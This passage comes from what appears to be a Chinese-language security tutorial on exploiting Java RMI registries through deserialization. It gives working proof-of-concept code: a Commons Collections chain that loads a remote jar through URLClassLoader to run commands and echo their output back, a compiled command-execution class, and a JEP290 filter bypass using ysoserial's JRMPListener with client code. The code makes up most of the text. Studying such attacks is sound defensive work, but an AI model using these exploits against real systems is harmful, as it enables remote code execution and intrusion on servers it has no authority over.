            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            User user = (User) registry.lookup("user");
            user.addUser(handler);
        }
    }
### 远程加载对象
和上边Server打Client一样利用条件非常苛刻。
参考：
## 利用URLClassLoader实现回显攻击
攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端
远程demo:
    import java.io.BufferedReader;
    import java.io.InputStreamReader;
    public class ErrorBaseExec {
        public static void do_exec(String args) throws Exception
        {
            Process proc = Runtime.getRuntime().exec(args);
            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();
            String line;
            while ((line = br.readLine()) != null)
            {
                sb.append(line).append("\n");
            }
            String result = sb.toString();
            Exception e=new Exception(result);
            throw e;
        }
    }
通过如下命令制作成jar包
    javac ErrorBaseExec.java
    jar -cvf RMIexploit.jar ErrorBaseExec.class
客户端POC:
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.net.URLClassLoader;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class Client {
        public static Constructor getFirstCtor(final String name)
                throws Exception {
            final Constructor ctor = Class.forName(name).getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            return ctor;
        }
        public static void main(String[] args) throws Exception {
            String ip = "127.0.0.1"; //注册中心ip
            int port = 1099; //注册中心端口
            String remotejar = 远程jar;
            String command = "whoami";
            final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
            try {
                final Transformer[] transformers = new Transformer[] {
                        new ConstantTransformer(java.net.URLClassLoader.class),
                        new InvokerTransformer("getConstructor",
                                new Class[] { Class[].class },
                                new Object[] { new Class[] { java.net.URL[].class } }),
                        new InvokerTransformer("newInstance",
                                new Class[] { Object[].class },
                                new Object[] {
                                        new Object[] {
                                                new java.net.URL[] { new java.net.URL(remotejar) }
                                        }
                                }),
                        new InvokerTransformer("loadClass",
                                new Class[] { String.class },
                                new Object[] { "ErrorBaseExec" }),
                        new InvokerTransformer("getMethod",
                                new Class[] { String.class, Class[].class },
                                new Object[] { "do_exec", new Class[] { String.class } }),
                        new InvokerTransformer("invoke",
                                new Class[] { Object.class, Object[].class },
                                new Object[] { null, new String[] { command } })
                };
                Transformer transformedChain = new ChainedTransformer(transformers);
                Map innerMap = new HashMap();
                innerMap.put("value", "value");
                Map outerMap = TransformedMap.decorate(innerMap, null,
                        transformedChain);
                Class cl = Class.forName(
                        "sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
                ctor.setAccessible(true);
                Object instance = ctor.newInstance(Target.class, outerMap);
                Registry registry = LocateRegistry.getRegistry(ip, port);
                InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)
                        .newInstance(Target.class,
                                outerMap);
                Remote r = Remote.class.cast(Proxy.newProxyInstance(
                        Remote.class.getClassLoader(),
                        new Class[] { Remote.class }, h));
                registry.bind("liming", r);
            } catch (Exception e) {
                try {
                    System.out.print(e.getCause().getCause().getCause().getMessage());
                } catch (Exception ee) {
                    throw e;
                }
            }
        }
    }
# JEP290及其绕过
## JEP290介绍
`JEP290`机制是用来过滤传入的序列化数据，以提高安全性，在反序列化的过程中，新增了一个`filterCheck`方法，所以，任何反序列化操作都会经过这个`filterCheck`方法，利用`checkInput`方法来对序列化数据进行检测，如果有任何不合格的检测，`Filter`将返回`REJECTED`。但是`jep290`的`filter`需要手动设置，通过`setObjectInputFilter`来设置`filter`，如果没有设置，还是不会有白名单。
    private static Status registryFilter(FilterInfo var0) {
            if (registryFilter != null) {
                Status var1 = registryFilter.checkInput(var0);
                if (var1 != Status.UNDECIDED) {
                    return var1;
                }
            }
            if (var0.depth() > (long)REGISTRY_MAX_DEPTH) {
                return Status.REJECTED;
            } else {
                Class var2 = var0.serialClass();
                if (var2 == null) {
                    return Status.UNDECIDED;
                } else {
                    if (var2.isArray()) {
                        if (var0.arrayLength() >= 0L && var0.arrayLength() > (long)REGISTRY_MAX_ARRAY_SIZE) {
                            return Status.REJECTED;
                        }
                        do {
                            var2 = var2.getComponentType();
                        } while(var2.isArray());
                    }
                    if (var2.isPrimitive()) {
                        return Status.ALLOWED;
                    } else {
                        return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
                    }
                }
            }
        }
设置的白名单如下
    String.class
    Remote.class
    Proxy.class
    UnicastRef.class
    RMIClientSocketFactory.class
    RMIServerSocketFactory.class
    ActivationID.class
    UID.class
JEP290本身是JDK9的产物，但是Oracle官方做了向下移植的处理，把JEP290的机制移植到了以下三个版本以及其修复后的版本中：
  * Java™ SE Development Kit 8, Update 121 (JDK 8u121)
  * Java™ SE Development Kit 7, Update 131 (JDK 7u131)
  * Java™ SE Development Kit 6, Update 141 (JDK 6u141)
以8u131作为测试
被拦截，返回`REJECTED`
## JEP290的绕过
Bypass的思路应该是从上面白名单的类或者他们的子类中寻找复写readObject利用点。
我们通过getRegistry时获得的注册中心，其实就是一个封装了UnicastServerRef对象的对象:
当我们调用bind方法后，会通过UnicastRef对象中存储的信息与注册中心进行通信:
这里会通过ref与注册中心通信，并将绑定的对象名称以及要绑定的远程对象发过去，注册中心在后续会对应进行反序列化
接着来看看yso中的JRMPClient：
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
    Registry.class
    }, obj);
    return proxy;
这里返回了一个代理对象，上面用的这些类都在白名单里，当注册中心反序列化时，会调用到RemoteObjectInvacationHandler父类RemoteObject的readObject方法（因为RemoteObjectInvacationHandler没有readObject方法），在readObject里的最后一行会调用ref.readExternal方法，并将ObjectInputStream传进去：
    ref.readExternal(in);
UnicastRef#readExternal
    public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException {
        this.ref = LiveRef.read(var1, false);
    }
LiveRef#read
这里在上边会把LiveRef对象还原，LiveRef对象中存了我们序列化进去的ip和端口，之后会调用DGCClient#registerRefs
    tatic void registerRefs(Endpoint var0, List var1) {
            DGCClient.EndpointEntry var2;
            do {
                var2 = DGCClient.EndpointEntry.lookup(var0);
            } while(!var2.registerRefs(var1));
        }
var2这里转回来的是一个DGCClient对象，里边同样封装了我们的端口信息，接着看到registerRefs方法中的`this.makeDirtyCall(var2,
var3);`
这里会调到DGCClient#makeDirtyCall，并把var2传进去，var2里封装了我们的endpoint信息
    Lease var7 = this.dgc.dirty(var4, var2, new Lease(DGCClient.vmid, DGCClient.leaseValue));
这里会进到dirty方法中，var4是我们传进去的ObjID对象，var1是一个HashSet对象，里边存了我们的Endpoint信息
    public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
            try {
                RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);
                try {
                    ObjectOutput var6 = var5.getOutputStream();
                    var6.writeObject(var1);
                    var6.writeLong(var2);
                    var6.writeObject(var4);
                } catch (IOException var20) {
                    throw new MarshalException("error marshalling arguments", var20);
                }
                super.ref.invoke(var5);
              try {
                    ObjectInput var9 = var5.getInputStream();
                    var24 = (Lease)var9.readObject();
这里wirteObject后，会用invoke将数据发出去，接下来从socket连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置filter，所以这里可以直接导致注册中心rce，所以我们可以伪造一个socket连接并把我们恶意序列化的对象发过去
我们利用ysoserial启动一个恶意的服务端
    java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "open -a Calculator"
对应客户端代码
    import sun.rmi.server.UnicastRef;
    import sun.rmi.transport.LiveRef;
    import sun.rmi.transport.tcp.TCPEndpoint;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Proxy;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.ObjID;
    import java.rmi.server.RemoteObjectInvocationHandler;
    import java.util.Random;
    public class Client {
        public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {
            Registry reg = LocateRegistry.getRegistry("127.0.0.1",7777);
            ObjID id = new ObjID(new Random().nextInt()); // RMI registry
            TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1099);
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
            RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
            Registry proxy = (Registry) Proxy.newProxyInstance(Client.class.getClassLoader(), new Class[] {
                    Registry.class
            }, obj);
            reg.bind("hello",proxy);
        }
    }
同理使用unbind、rebind、lookup也是可以的，该方式在JDK<=8u231时可用，在8u241被修复
(Ps:JEP290感觉还不是很清楚，我的理解是建立一个socket连接传输数据，注册中心会直接进行反序列化，不会先进行filter)